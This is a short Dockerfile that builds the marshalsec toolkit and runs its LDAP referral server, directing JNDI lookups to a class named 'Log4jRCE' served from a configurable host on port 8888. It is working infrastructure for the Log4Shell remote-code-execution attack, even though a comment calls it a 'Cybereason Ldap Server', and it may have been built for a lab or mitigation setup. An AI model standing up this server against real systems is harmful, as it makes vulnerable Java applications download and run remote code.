FROM ubuntu:18.04

# Install dependencies
RUN apt-get update && apt-get install -y \
 default-jdk \
 maven \
 python3 \
 git

# Install Cybereason Ldap Server
RUN git clone https://github.com/mbechler/marshalsec.git /root/new
WORKDIR /root/new
RUN mvn package -DskipTests
WORKDIR /root/new/target
ARG host_ip
ARG mode
CMD java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$host_ip:8888/#Log4jRCE$mode"

EXPOSE 1389